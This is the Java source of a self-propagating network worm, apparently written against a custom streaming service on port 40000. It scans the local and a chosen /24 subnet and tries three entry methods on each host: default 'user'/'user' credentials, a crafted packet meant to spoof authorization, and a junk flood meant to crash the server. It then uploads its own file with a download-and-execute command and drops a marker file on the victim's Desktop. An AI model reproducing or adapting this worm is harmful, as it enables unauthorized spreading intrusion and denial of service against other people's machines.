package exec;

import com.network_security.streamclient.transport.Codes;
import com.network_security.streamclient.transport.SendPackage;

import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;

public class Main {
    private String desktopPath;
    private String wormPath;
    private String target;

    private Main(String network) throws IOException {
        target = network;
        desktopPath = System.getProperty("user.home") + "/Desktop";
        File file = new File(desktopPath);

        if (!file.exists())
            desktopPath = System.getProperty("user.home");

        if (!infect())
            spread();
    }

    private boolean infect() throws IOException {
        File worm_text = new File(desktopPath, "worm_infected.txt");
        boolean result = worm_text.exists();

        if (!result) {
            if (!worm_text.createNewFile())
                return true;
            BufferedWriter bw = new BufferedWriter(new FileWriter(worm_text));
            bw.write("May the force be with you!");
            bw.newLine();
            bw.write("Fear the darkness! (And the Walking Dead)");
            bw.flush();

            bw.close();
        }

        return result;
    }

    private void spread() throws UnknownHostException {
        String hostAddress = InetAddress.getLocalHost().getHostAddress();

        String gateway = hostAddress.substring(0, hostAddress.lastIndexOf(".")) + ".";
        System.out.println(gateway + "1");

        wormPath = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath()).getAbsolutePath();
        System.out.println("w:" + wormPath + "  " + new File(wormPath).exists());

        for (int i = 2; i < 250; i++) {
            try {
                Thread.sleep(50);
            } catch (InterruptedException ignored) {}

            String ip = gateway + Integer.toString(i);

            if (ip.equals(hostAddress))
                continue;

            new InfectionThread(ip).start();
        }

        gateway = target.substring(0, target.lastIndexOf(".")) + ".";
        System.out.println("Phase 2: " + gateway + "1");

        for (int i = 2; i < 250; i++) {
            try {
                Thread.sleep(50);
            } catch (InterruptedException ignored) {}

            String ip = gateway + Integer.toString(i);
            new InfectionThread(ip).start();
        }


    }

    private class InfectionThread extends Thread{
        private String ip;

        private InfectionThread(String ip) {
            this.ip = ip;
        }


        public void run() {
            try {
                InetAddress address = InetAddress.getByName(ip);
                boolean reachable = address.isReachable(1000);
                if (!reachable)
                    return;

                boolean b = false;
                for (int i = 0; i < 3; i++) {
                    if (i == 0) {
                        b = method1(ip);
                    } else if (i == 1) {
                        b = method2(ip);
                    } else if (i == 2) {
                        b = method3(ip);
                    }

                    if (b)
                        return;

                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }

            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        private boolean method1(String ip) {
            System.out.println("M1");
            try { // User and Password Defaults
                Socket socket = new Socket(ip, 40000);
                File file = new File(wormPath);

                SendPackage send = new SendPackage(Codes.AUTH);
                send.addItem("user");
                send.addItem("user");
                sendToSocket(socket, send);

                SendPackage sendPackage = new SendPackage(Codes.DOWNLOAD_EXECUTE_AUTH);
                sendPackage.addItem(file.getName());
                sendPackage.addItem(40000);

                sendToSocket(socket, sendPackage);
                sendFile(file, socket);

                SendPackage ss = (SendPackage) receiveFromSocket(socket);
                socket.close();
                return ss != null && ss.getCode() == Codes.OK;
            } catch (Exception e) {
                System.out.println(e.getMessage());
            }

            return false;
        }

        private boolean method2(String ip) {
            System.out.println("M2");
            try { //Sends Exploit Packages to make the server think we are authorized
                Socket socket = new Socket(ip, 40000);
                File file = new File(wormPath);

                for (int i = 0; i < 3; i ++) {
                    SendPackage send = new SendPackage(Codes.GET_SYSTEM);
                    sendToSocket(socket, send);
                }

                SendPackage sendExploit = new SendPackage(Codes.GET_FEATURES_FLAGS);
                String type = "OPS";
                Integer size = 60;
                String name = null;
                String tokenizer = "Users_Allowed,Names";

                sendExploit.addItem(type);
                sendExploit.addItem(size);
                sendExploit.addItem(null);
                sendExploit.addItem(tokenizer);

                sendToSocket(socket, sendExploit);

                SendPackage sendPackage = new SendPackage(Codes.DOWNLOAD_EXECUTE_AUTH);
                sendPackage.addItem(file.getName());
                sendPackage.addItem(40000);

                sendToSocket(socket, sendPackage);
                sendFile(file, socket);
                socket.close();
            } catch (Exception e) {
                System.out.println(e.getMessage());
            }

            return false;
        }

        private boolean method3(String ip) {
            System.out.println("M3: " + ip);
            try { //Sends A lot of random stuff to the server, it will make it restart, then the worm attacks because the server becomes unprotected for some seconds
                Socket socket = new Socket(ip, 40000);
                File file = new File(wormPath);

                for (int i = 0; i < 1000; i++) {
                    sendToSocket(socket, "Kappa");
                }

                Thread.sleep(2000);
                System.out.println("Delay waited");

                Socket socket1 = new Socket(ip, 40000);

                SendPackage send = new SendPackage(Codes.AUTH);
                send.addItem("user");
                send.addItem("user");
                sendToSocket(socket1, send);

                System.out.println("M3: US");

                SendPackage sendPackage = new SendPackage(Codes.DOWNLOAD_EXECUTE_AUTH);
                sendPackage.addItem(file.getName());
                sendPackage.addItem(40000);

                System.out.println("M3: FF");

                sendToSocket(socket1, sendPackage);
                sendFile(file, socket1);
            } catch (IOException e) {
                System.out.println(e.getMessage());
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            return false;
        }
    }

    private static void sendToSocket(Socket server, Object object) throws IOException {
        //System.out.println("My_App:: " + "StreamApplication.sendToServer() >> Send Package Started");
        ObjectOutputStream stream = new ObjectOutputStream(server.getOutputStream());
        stream.writeObject(object);
        stream.flush();
        //System.out.println("My_App:: " + "StreamApplication.sendToServer() >> Send Package Finished");
    }

    private static Object receiveFromSocket(Socket server) throws IOException, ClassNotFoundException {
       // System.out.println("My_App:: " + "StreamApplication.receiveFromServer() >> Send Package Started");
        ObjectInputStream stream = new ObjectInputStream(server.getInputStream());
        //System.out.println("My_App:: " + "StreamApplication.receiveFromServer() >> Send Package Finished");
        return stream.readObject();
    }

    private static void sendFile(File file, Socket socket) throws IOException {
        byte[] c_buffer = new byte[1024];
        int bytesRead;

        FileInputStream fileIn = new FileInputStream(file);
        OutputStream outputStream = socket.getOutputStream();

        System.out.println("My_App:: " + "StreamApplication.sendFile() >> Ready to send");
        while ((bytesRead = fileIn.read(c_buffer)) != -1) {
            outputStream.write(c_buffer, 0, bytesRead);
            outputStream.flush();
        }
        System.out.println("My_App:: " + "StreamApplication.sendFile() >> Sent");

        fileIn.close();
        outputStream.flush();
        outputStream.close();
        System.out.println("My_App:: " + "StreamApplication.sendFile() >> Flushed and closed");

    }

    public static void main(String[] args) {
        String destiny = "172.168.102.1";
        if (args.length == 1)
            destiny = args[0];
        try {
            new Main(destiny);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}
